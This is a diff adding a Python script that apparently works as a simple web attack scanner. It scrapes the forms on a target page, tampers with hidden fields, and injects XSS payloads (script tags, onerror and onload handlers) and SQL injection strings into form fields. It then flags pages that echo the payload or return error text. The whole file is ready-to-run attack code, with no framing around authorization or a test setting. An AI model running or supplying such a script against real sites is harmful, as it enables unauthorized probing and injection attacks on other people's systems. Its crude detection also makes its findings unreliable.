@@ -1,0 +1,95 @@
+import requests
+from bs4 import BeautifulSoup
+
+# Define common XSS and SQL Injection payloads
+XSS_PAYLOADS = [
+    "<script>alert('XSS')</script>",
+    "<img src=x onerror=alert(1)>",
+    "<svg onload=alert('XSS')>",
+]
+SQLI_PAYLOADS = [
+    "' OR '1'='1", 
+    "' OR '1'='1' --", 
+    """' OR '1'='1' /*""",
+]
+
+# Target URL to scan
+TARGET_URL = "https://example.com/form_page"
+
+# Fetch the page content
+response = requests.get(TARGET_URL)
+soup = BeautifulSoup(response.text, "html.parser")
+
+# Find all forms on the page
+forms = soup.find_all("form")
+
+print(f"[+] Found {len(forms)} form(s) on {TARGET_URL}\n")
+
+# Iterate through each form
+for i, form in enumerate(forms, start=1):
+    action = form.get("action") or TARGET_URL
+    method = form.get("method", "get").lower()
+    
+    print(f"[+] Testing Form {i}: {action} [{method.upper()}]")
+    
+    form_data = {}
+    hidden_fields = []
+    csrf_token = None
+    
+    # Find input fields
+    for input_tag in form.find_all("input"):
+        name = input_tag.get("name")
+        value = input_tag.get("value", "")
+        input_type = input_tag.get("type", "text")
+        
+        # Check for CSRF tokens
+        if "csrf" in name.lower():
+            csrf_token = value
+            print(f"[!] Possible CSRF token found: {name} -> {value}")
+        
+        # Check for hidden fields
+        if input_type == "hidden":
+            hidden_fields.append(name)
+        
+        # Prepare data for form submission (default values)
+        form_data[name] = "test_value"
+    
+    # Modify hidden fields for testing
+    for hidden_field in hidden_fields:
+        form_data[hidden_field] = "modified_value"
+        print(f"[*] Modifying hidden field: {hidden_field}")
+    
+    # Test XSS injection
+    for xss in XSS_PAYLOADS:
+        xss_test_data = form_data.copy()
+        xss_test_data[list(form_data.keys())[0]] = xss  # Inject XSS in the first field
+        
+        if method == "post":
+            response = requests.post(action, data=xss_test_data)
+        else:
+            response = requests.get(action, params=xss_test_data)
+        
+        if xss in response.text:
+            print(f"[!] XSS detected using payload: {xss}\n")
+    
+    # Test SQL Injection
+    for sqli in SQLI_PAYLOADS:
+        sqli_test_data = form_data.copy()
+        sqli_test_data[list(form_data.keys())[0]] = sqli  # Inject SQLi in the first field
+        
+        if method == "post":
+            response = requests.post(action, data=sqli_test_data)
+        else:
+            response = requests.get(action, params=sqli_test_data)
+        
+        if "error" in response.text.lower() or "sql" in response.text.lower():
+            print(f"[!] SQL Injection detected using payload: {sqli}\n")
+    
+    # Send modified form data
+    if method == "post":
+        response = requests.post(action, data=form_data)
+    else:
+        response = requests.get(action, params=form_data)
+    
+    print("[*] Form submission tested. Check server response for anomalies.")
+    print("-" * 50)
